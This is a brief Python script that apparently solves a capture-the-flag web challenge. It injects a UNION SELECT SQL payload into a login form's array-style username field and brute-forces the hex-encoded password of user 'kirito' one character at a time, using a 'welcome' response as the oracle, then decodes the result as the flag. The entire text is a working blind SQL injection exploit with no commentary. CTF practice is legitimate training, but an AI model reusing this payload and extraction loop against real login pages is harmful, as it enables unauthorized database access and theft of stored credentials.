import requests
import string

ip = '140.112.16.145'
host = "https://sao.h4ck3r.quest/login"

FLAG = ""

for i in range(1, 113, 1):
    print("idx: ", i)
    for c in range(0, 16):
        a = requests.post(host, data={
            'username[]': f"' union select 1,SUBSTRING(hex(password), {i}, 1),'{ip}' from users where username = 'kirito' --",
            'password': hex(c)[2:].upper()
        })
        if "welcome" in a.text:
            FLAG += hex(c)[2:].upper()
            print(FLAG)
            break

print(bytes.fromhex(FLAG).decode())
